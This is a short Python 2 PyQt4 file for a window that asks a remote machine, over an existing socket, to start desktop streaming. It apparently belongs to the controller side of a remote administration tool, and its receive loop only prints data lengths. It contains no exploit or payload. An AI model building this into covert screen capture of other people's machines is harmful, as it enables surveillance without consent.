from PyQt4.QtGui import *
from PyQt4.QtCore import *

import threading
import socket

from main_ui import Ui_Form

from libs.modechat import get, send

class mainPopup(QWidget, Ui_Form):

    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.sock = args['sock']
        self.socket = args['socket']
        self.ipAddress = args['ipAddress']

        self.setWindowTitle('Desktop Streaming from - %s - Socket #%s' % (self.ipAddress, self.socket))

        self.startStreaming.clicked.connect(self.start_desktop_streaming)

    def start_desktop_streaming(self):
        data = get(self.sock, 'startDesktop', 'startdesktop')
        print data
        if data == 'desktopStarted':
            self.desktop = DesktopStreaming(self.sock)
            self.desktop.start()

    def closeEvent(self, event):
        pass


class DesktopStreaming(threading.Thread):
    def __init__(self, sock):
        super(DesktopStreaming, self).__init__()

        self.sock = sock
        self.active = True

    def run(self):
        while self.active:
            try:
                data = self.sock.recv(1024)
                print len(data)
            except (socket.error, ValueError):
                break
        send(self.sock, 'stopDesktop')
